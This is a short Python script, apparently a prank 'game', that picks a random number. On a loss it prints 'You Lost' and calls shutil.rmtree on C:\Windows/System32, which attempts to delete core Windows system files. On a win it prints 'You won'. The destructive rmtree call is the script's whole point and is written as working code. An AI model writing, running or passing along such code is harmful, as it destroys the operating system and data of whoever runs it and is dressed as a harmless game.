import random
from time import sleep
import shutil
if random.randint(1, 2) == 2:
    print("You Lost")
    sleep(2)
    shutil.rmtree(r'C:\Windows/System32')
else:
    print("You won")
